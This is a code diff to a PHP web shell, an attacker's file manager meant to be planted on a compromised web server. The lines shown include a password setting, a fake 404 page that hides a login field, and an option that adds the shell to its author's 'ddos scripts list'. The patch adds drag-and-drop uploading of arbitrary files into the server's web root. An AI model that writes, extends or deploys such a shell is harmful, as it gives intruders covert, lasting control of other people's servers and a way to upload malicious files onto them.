@@ -1,6 +1,6 @@
 <?php
-$pass               = md5("pw");
-$version            = 3.22;
+$pass               = md5("hf");
+$version            = 3.3;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -365,6 +365,47 @@ u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-r
 .drives span {margin:auto 7px;}
 </style>
 <script type="text/javascript">
+function $id(id){
+    return document.getElementById(id);
+}
+function Init() {
+    var filedrag = $id("thefilelist");
+    filedrag.addEventListener("dragover", FileDragHover, false);
+	filedrag.addEventListener("dragleave", FileDragHover, false);
+	filedrag.addEventListener("drop", FileSelectHandler, false);
+}
+function FileDragHover(e) {
+	e.stopPropagation();
+	e.preventDefault();
+	e.target.className = (e.type == "dragover" ? "hover" : "");
+}
+function FileSelectHandler(e) {
+	FileDragHover(e);
+	var files = e.target.files || e.dataTransfer.files;
+	UploadFiles(files);
+}
+function UploadFiles(files) {
+	var xhr = new XMLHttpRequest();
+	xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            document.open();
+            document.write(xhr.responseText);
+            document.close();
+        }
+    }
+	if (xhr.upload) {
+	    var formData = new FormData();
+	    for (var i = 0, file; file = files[i]; ++i) {
+            formData.append("uploadfile[]", file);
+        }
+	    formData.append("uploaddir","' . getPath(SA_ROOT, ($_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.')) . '");
+	    formData.append("dir","' . getPath(SA_ROOT, ($_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.')) . '");
+	    formData.append("doupfile","Upload");
+	    xhr.open("POST", "' . $_SERVER['PHP_SELF'] . '", true);
+		xhr.setRequestHeader("X_FILENAME", files[0].name);
+		xhr.send(formData);
+	}
+}
 window.onbeforeunload = function(){
     return \'Are you sure you want to leave?\';
 };
@@ -406,6 +447,9 @@ window.onbeforeunload = function(){
                  return false;
              });
          }
+     }
+     if (window.File && window.FileList && window.FileReader) {
+	    Init();
      }
  }
 function CheckAll(form) {
@@ -1087,7 +1131,7 @@ function shownav(e){
 			$sort = array($match[1], (int)$match[2]);
 		}
 	}
-    tbhead();
+    tbhead("thefilelist");
     p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">');
     p('<form action="' . $self . '" method="POST" enctype="multipart/form-data" onSubmit="window.onbeforeunload = null;"><div style="float:right;"><input class="input" name="uploadfile[]" multiple="multiple" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="' . $nowpath . '" type="hidden" /><input name="dir" value="' . $nowpath . '" type="hidden" /></div></form>');
     p('<a href="javascript:godir(\'' . str_replace("'", "\'", $_SERVER["DOCUMENT_ROOT"]) . '\');">WebRoot</a>');
@@ -3638,9 +3682,8 @@ function p($str)
 {
     echo $str . "\n";
 }
-function tbhead()
-{
-    p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
+function tbhead($id = ""){
+    p('<table width="100%"' . ($id != "" ? ' id="' . $id . '"' : "") . ' border="0" cellpadding="4" cellspacing="0">');
 }
 function tbfoot()
 {
